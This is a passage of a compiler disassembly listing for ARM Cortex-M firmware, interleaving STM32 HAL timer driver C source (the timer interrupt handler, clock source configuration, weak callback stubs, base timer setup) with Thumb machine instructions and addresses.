 8004e9c:	6878      	ldr	r0, [r7, #4]
 8004e9e:	f000 f964 	bl	800516a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004ea2:	687b      	ldr	r3, [r7, #4]
 8004ea4:	2200      	movs	r2, #0
 8004ea6:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004ea8:	68bb      	ldr	r3, [r7, #8]
 8004eaa:	f003 0310 	and.w	r3, r3, #16
 8004eae:	2b00      	cmp	r3, #0
 8004eb0:	d020      	beq.n	8004ef4 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004eb2:	68fb      	ldr	r3, [r7, #12]
 8004eb4:	f003 0310 	and.w	r3, r3, #16
 8004eb8:	2b00      	cmp	r3, #0
 8004eba:	d01b      	beq.n	8004ef4 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004ebc:	687b      	ldr	r3, [r7, #4]
 8004ebe:	681b      	ldr	r3, [r3, #0]
 8004ec0:	f06f 0210 	mvn.w	r2, #16
 8004ec4:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004ec6:	687b      	ldr	r3, [r7, #4]
 8004ec8:	2208      	movs	r2, #8
 8004eca:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004ecc:	687b      	ldr	r3, [r7, #4]
 8004ece:	681b      	ldr	r3, [r3, #0]
 8004ed0:	69db      	ldr	r3, [r3, #28]
 8004ed2:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004ed6:	2b00      	cmp	r3, #0
 8004ed8:	d003      	beq.n	8004ee2 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004eda:	6878      	ldr	r0, [r7, #4]
 8004edc:	f000 f93b 	bl	8005156 <HAL_TIM_IC_CaptureCallback>
 8004ee0:	e005      	b.n	8004eee <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004ee2:	6878      	ldr	r0, [r7, #4]
 8004ee4:	f000 f92d 	bl	8005142 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004ee8:	6878      	ldr	r0, [r7, #4]
 8004eea:	f000 f93e 	bl	800516a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004eee:	687b      	ldr	r3, [r7, #4]
 8004ef0:	2200      	movs	r2, #0
 8004ef2:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004ef4:	68bb      	ldr	r3, [r7, #8]
 8004ef6:	f003 0301 	and.w	r3, r3, #1
 8004efa:	2b00      	cmp	r3, #0
 8004efc:	d00c      	beq.n	8004f18 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004efe:	68fb      	ldr	r3, [r7, #12]
 8004f00:	f003 0301 	and.w	r3, r3, #1
 8004f04:	2b00      	cmp	r3, #0
 8004f06:	d007      	beq.n	8004f18 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004f08:	687b      	ldr	r3, [r7, #4]
 8004f0a:	681b      	ldr	r3, [r3, #0]
 8004f0c:	f06f 0201 	mvn.w	r2, #1
 8004f10:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004f12:	6878      	ldr	r0, [r7, #4]
 8004f14:	f7fb fe64 	bl	8000be0 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004f18:	68bb      	ldr	r3, [r7, #8]
 8004f1a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f1e:	2b00      	cmp	r3, #0
 8004f20:	d00c      	beq.n	8004f3c <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f22:	68fb      	ldr	r3, [r7, #12]
 8004f24:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f28:	2b00      	cmp	r3, #0
 8004f2a:	d007      	beq.n	8004f3c <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004f2c:	687b      	ldr	r3, [r7, #4]
 8004f2e:	681b      	ldr	r3, [r3, #0]
 8004f30:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004f34:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004f36:	6878      	ldr	r0, [r7, #4]
 8004f38:	f000 fa9a 	bl	8005470 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004f3c:	68bb      	ldr	r3, [r7, #8]
 8004f3e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004f42:	2b00      	cmp	r3, #0
 8004f44:	d00c      	beq.n	8004f60 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f46:	68fb      	ldr	r3, [r7, #12]
 8004f48:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f4c:	2b00      	cmp	r3, #0
 8004f4e:	d007      	beq.n	8004f60 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004f50:	687b      	ldr	r3, [r7, #4]
 8004f52:	681b      	ldr	r3, [r3, #0]
 8004f54:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004f58:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004f5a:	6878      	ldr	r0, [r7, #4]
 8004f5c:	f000 fa92 	bl	8005484 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004f60:	68bb      	ldr	r3, [r7, #8]
 8004f62:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f66:	2b00      	cmp	r3, #0
 8004f68:	d00c      	beq.n	8004f84 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004f6a:	68fb      	ldr	r3, [r7, #12]
 8004f6c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f70:	2b00      	cmp	r3, #0
 8004f72:	d007      	beq.n	8004f84 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004f74:	687b      	ldr	r3, [r7, #4]
 8004f76:	681b      	ldr	r3, [r3, #0]
 8004f78:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004f7c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004f7e:	6878      	ldr	r0, [r7, #4]
 8004f80:	f000 f8fd 	bl	800517e <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004f84:	68bb      	ldr	r3, [r7, #8]
 8004f86:	f003 0320 	and.w	r3, r3, #32
 8004f8a:	2b00      	cmp	r3, #0
 8004f8c:	d00c      	beq.n	8004fa8 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004f8e:	68fb      	ldr	r3, [r7, #12]
 8004f90:	f003 0320 	and.w	r3, r3, #32
 8004f94:	2b00      	cmp	r3, #0
 8004f96:	d007      	beq.n	8004fa8 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004f98:	687b      	ldr	r3, [r7, #4]
 8004f9a:	681b      	ldr	r3, [r3, #0]
 8004f9c:	f06f 0220 	mvn.w	r2, #32
 8004fa0:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8004fa2:	6878      	ldr	r0, [r7, #4]
 8004fa4:	f000 fa5a 	bl	800545c <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8004fa8:	bf00      	nop
 8004faa:	3710      	adds	r7, #16
 8004fac:	46bd      	mov	sp, r7
 8004fae:	bd80      	pop	{r7, pc}

08004fb0 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8004fb0:	b580      	push	{r7, lr}
 8004fb2:	b084      	sub	sp, #16
 8004fb4:	af00      	add	r7, sp, #0
 8004fb6:	6078      	str	r0, [r7, #4]
 8004fb8:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8004fba:	2300      	movs	r3, #0
 8004fbc:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8004fbe:	687b      	ldr	r3, [r7, #4]
 8004fc0:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8004fc4:	2b01      	cmp	r3, #1
 8004fc6:	d101      	bne.n	8004fcc <HAL_TIM_ConfigClockSource+0x1c>
 8004fc8:	2302      	movs	r3, #2
 8004fca:	e0b6      	b.n	800513a <HAL_TIM_ConfigClockSource+0x18a>
 8004fcc:	687b      	ldr	r3, [r7, #4]
 8004fce:	2201      	movs	r2, #1
 8004fd0:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8004fd4:	687b      	ldr	r3, [r7, #4]
 8004fd6:	2202      	movs	r2, #2
 8004fd8:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8004fdc:	687b      	ldr	r3, [r7, #4]
 8004fde:	681b      	ldr	r3, [r3, #0]
 8004fe0:	689b      	ldr	r3, [r3, #8]
 8004fe2:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8004fe4:	68bb      	ldr	r3, [r7, #8]
 8004fe6:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004fea:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 8004fee:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8004ff0:	68bb      	ldr	r3, [r7, #8]
 8004ff2:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8004ff6:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8004ff8:	687b      	ldr	r3, [r7, #4]
 8004ffa:	681b      	ldr	r3, [r3, #0]
 8004ffc:	68ba      	ldr	r2, [r7, #8]
 8004ffe:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8005000:	683b      	ldr	r3, [r7, #0]
 8005002:	681b      	ldr	r3, [r3, #0]
 8005004:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005008:	d03e      	beq.n	8005088 <HAL_TIM_ConfigClockSource+0xd8>
 800500a:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 800500e:	f200 8087 	bhi.w	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005012:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8005016:	f000 8086 	beq.w	8005126 <HAL_TIM_ConfigClockSource+0x176>
 800501a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800501e:	d87f      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005020:	2b70      	cmp	r3, #112	; 0x70
 8005022:	d01a      	beq.n	800505a <HAL_TIM_ConfigClockSource+0xaa>
 8005024:	2b70      	cmp	r3, #112	; 0x70
 8005026:	d87b      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005028:	2b60      	cmp	r3, #96	; 0x60
 800502a:	d050      	beq.n	80050ce <HAL_TIM_ConfigClockSource+0x11e>
 800502c:	2b60      	cmp	r3, #96	; 0x60
 800502e:	d877      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005030:	2b50      	cmp	r3, #80	; 0x50
 8005032:	d03c      	beq.n	80050ae <HAL_TIM_ConfigClockSource+0xfe>
 8005034:	2b50      	cmp	r3, #80	; 0x50
 8005036:	d873      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005038:	2b40      	cmp	r3, #64	; 0x40
 800503a:	d058      	beq.n	80050ee <HAL_TIM_ConfigClockSource+0x13e>
 800503c:	2b40      	cmp	r3, #64	; 0x40
 800503e:	d86f      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005040:	2b30      	cmp	r3, #48	; 0x30
 8005042:	d064      	beq.n	800510e <HAL_TIM_ConfigClockSource+0x15e>
 8005044:	2b30      	cmp	r3, #48	; 0x30
 8005046:	d86b      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005048:	2b20      	cmp	r3, #32
 800504a:	d060      	beq.n	800510e <HAL_TIM_ConfigClockSource+0x15e>
 800504c:	2b20      	cmp	r3, #32
 800504e:	d867      	bhi.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
 8005050:	2b00      	cmp	r3, #0
 8005052:	d05c      	beq.n	800510e <HAL_TIM_ConfigClockSource+0x15e>
 8005054:	2b10      	cmp	r3, #16
 8005056:	d05a      	beq.n	800510e <HAL_TIM_ConfigClockSource+0x15e>
 8005058:	e062      	b.n	8005120 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 800505a:	687b      	ldr	r3, [r7, #4]
 800505c:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 800505e:	683b      	ldr	r3, [r7, #0]
 8005060:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005062:	683b      	ldr	r3, [r7, #0]
 8005064:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005066:	683b      	ldr	r3, [r7, #0]
 8005068:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 800506a:	f000 f971 	bl	8005350 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 800506e:	687b      	ldr	r3, [r7, #4]
 8005070:	681b      	ldr	r3, [r3, #0]
 8005072:	689b      	ldr	r3, [r3, #8]
 8005074:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 8005076:	68bb      	ldr	r3, [r7, #8]
 8005078:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 800507c:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 800507e:	687b      	ldr	r3, [r7, #4]
 8005080:	681b      	ldr	r3, [r3, #0]
 8005082:	68ba      	ldr	r2, [r7, #8]
 8005084:	609a      	str	r2, [r3, #8]
      break;
 8005086:	e04f      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005088:	687b      	ldr	r3, [r7, #4]
 800508a:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 800508c:	683b      	ldr	r3, [r7, #0]
 800508e:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005090:	683b      	ldr	r3, [r7, #0]
 8005092:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005094:	683b      	ldr	r3, [r7, #0]
 8005096:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005098:	f000 f95a 	bl	8005350 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 800509c:	687b      	ldr	r3, [r7, #4]
 800509e:	681b      	ldr	r3, [r3, #0]
 80050a0:	689a      	ldr	r2, [r3, #8]
 80050a2:	687b      	ldr	r3, [r7, #4]
 80050a4:	681b      	ldr	r3, [r3, #0]
 80050a6:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 80050aa:	609a      	str	r2, [r3, #8]
      break;
 80050ac:	e03c      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80050ae:	687b      	ldr	r3, [r7, #4]
 80050b0:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050b2:	683b      	ldr	r3, [r7, #0]
 80050b4:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050b6:	683b      	ldr	r3, [r7, #0]
 80050b8:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80050ba:	461a      	mov	r2, r3
 80050bc:	f000 f8ce 	bl	800525c <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 80050c0:	687b      	ldr	r3, [r7, #4]
 80050c2:	681b      	ldr	r3, [r3, #0]
 80050c4:	2150      	movs	r1, #80	; 0x50
 80050c6:	4618      	mov	r0, r3
 80050c8:	f000 f927 	bl	800531a <TIM_ITRx_SetConfig>
      break;
 80050cc:	e02c      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 80050ce:	687b      	ldr	r3, [r7, #4]
 80050d0:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050d2:	683b      	ldr	r3, [r7, #0]
 80050d4:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050d6:	683b      	ldr	r3, [r7, #0]
 80050d8:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 80050da:	461a      	mov	r2, r3
 80050dc:	f000 f8ed 	bl	80052ba <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 80050e0:	687b      	ldr	r3, [r7, #4]
 80050e2:	681b      	ldr	r3, [r3, #0]
 80050e4:	2160      	movs	r1, #96	; 0x60
 80050e6:	4618      	mov	r0, r3
 80050e8:	f000 f917 	bl	800531a <TIM_ITRx_SetConfig>
      break;
 80050ec:	e01c      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80050ee:	687b      	ldr	r3, [r7, #4]
 80050f0:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050f2:	683b      	ldr	r3, [r7, #0]
 80050f4:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050f6:	683b      	ldr	r3, [r7, #0]
 80050f8:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80050fa:	461a      	mov	r2, r3
 80050fc:	f000 f8ae 	bl	800525c <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 8005100:	687b      	ldr	r3, [r7, #4]
 8005102:	681b      	ldr	r3, [r3, #0]
 8005104:	2140      	movs	r1, #64	; 0x40
 8005106:	4618      	mov	r0, r3
 8005108:	f000 f907 	bl	800531a <TIM_ITRx_SetConfig>
      break;
 800510c:	e00c      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 800510e:	687b      	ldr	r3, [r7, #4]
 8005110:	681a      	ldr	r2, [r3, #0]
 8005112:	683b      	ldr	r3, [r7, #0]
 8005114:	681b      	ldr	r3, [r3, #0]
 8005116:	4619      	mov	r1, r3
 8005118:	4610      	mov	r0, r2
 800511a:	f000 f8fe 	bl	800531a <TIM_ITRx_SetConfig>
      break;
 800511e:	e003      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 8005120:	2301      	movs	r3, #1
 8005122:	73fb      	strb	r3, [r7, #15]
      break;
 8005124:	e000      	b.n	8005128 <HAL_TIM_ConfigClockSource+0x178>
      break;
 8005126:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005128:	687b      	ldr	r3, [r7, #4]
 800512a:	2201      	movs	r2, #1
 800512c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005130:	687b      	ldr	r3, [r7, #4]
 8005132:	2200      	movs	r2, #0
 8005134:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005138:	7bfb      	ldrb	r3, [r7, #15]
}
 800513a:	4618      	mov	r0, r3
 800513c:	3710      	adds	r7, #16
 800513e:	46bd      	mov	sp, r7
 8005140:	bd80      	pop	{r7, pc}

08005142 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 8005142:	b480      	push	{r7}
 8005144:	b083      	sub	sp, #12
 8005146:	af00      	add	r7, sp, #0
 8005148:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 800514a:	bf00      	nop
 800514c:	370c      	adds	r7, #12
 800514e:	46bd      	mov	sp, r7
 8005150:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005154:	4770      	bx	lr

08005156 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 8005156:	b480      	push	{r7}
 8005158:	b083      	sub	sp, #12
 800515a:	af00      	add	r7, sp, #0
 800515c:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 800515e:	bf00      	nop
 8005160:	370c      	adds	r7, #12
 8005162:	46bd      	mov	sp, r7
 8005164:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005168:	4770      	bx	lr

0800516a <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 800516a:	b480      	push	{r7}
 800516c:	b083      	sub	sp, #12
 800516e:	af00      	add	r7, sp, #0
 8005170:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 8005172:	bf00      	nop
 8005174:	370c      	adds	r7, #12
 8005176:	46bd      	mov	sp, r7
 8005178:	f85d 7b04 	ldr.w	r7, [sp], #4
 800517c:	4770      	bx	lr

0800517e <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 800517e:	b480      	push	{r7}
 8005180:	b083      	sub	sp, #12
 8005182:	af00      	add	r7, sp, #0
 8005184:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 8005186:	bf00      	nop
 8005188:	370c      	adds	r7, #12
 800518a:	46bd      	mov	sp, r7
 800518c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005190:	4770      	bx	lr
	...

08005194 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 8005194:	b480      	push	{r7}
 8005196:	b085      	sub	sp, #20
 8005198:	af00      	add	r7, sp, #0
 800519a:	6078      	str	r0, [r7, #4]
 800519c:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 800519e:	687b      	ldr	r3, [r7, #4]
 80051a0:	681b      	ldr	r3, [r3, #0]
 80051a2:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 80051a4:	687b      	ldr	r3, [r7, #4]
 80051a6:	4a2a      	ldr	r2, [pc, #168]	; (8005250 <TIM_Base_SetConfig+0xbc>)
 80051a8:	4293      	cmp	r3, r2
 80051aa:	d003      	beq.n	80051b4 <TIM_Base_SetConfig+0x20>
 80051ac:	687b      	ldr	r3, [r7, #4]
 80051ae:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80051b2:	d108      	bne.n	80051c6 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 80051b4:	68fb      	ldr	r3, [r7, #12]
 80051b6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80051ba:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 80051bc:	683b      	ldr	r3, [r7, #0]
 80051be:	685b      	ldr	r3, [r3, #4]
 80051c0:	68fa      	ldr	r2, [r7, #12]
 80051c2:	4313      	orrs	r3, r2
 80051c4:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 80051c6:	687b      	ldr	r3, [r7, #4]
 80051c8:	4a21      	ldr	r2, [pc, #132]	; (8005250 <TIM_Base_SetConfig+0xbc>)
 80051ca:	4293      	cmp	r3, r2
